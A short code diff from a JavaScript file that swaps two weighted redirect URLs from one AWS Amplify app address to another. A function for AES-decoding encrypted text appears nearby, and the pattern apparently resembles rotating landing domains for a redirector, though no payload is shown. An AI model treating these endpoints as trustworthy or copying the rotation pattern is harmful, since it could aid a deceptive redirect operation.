@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://main.dr0rzjqt5cwpe.amplifyapp.com/", weight: 0.5 },
-        { url: "https://main.dr0rzjqt5cwpe.amplifyapp.com/", weight: 0.5 }
+        { url: "https://main.d1t14m4b28lbvo.amplifyapp.com/", weight: 0.5 },
+        { url: "https://main.d1t14m4b28lbvo.amplifyapp.com/", weight: 0.5 }
       
     ];
 
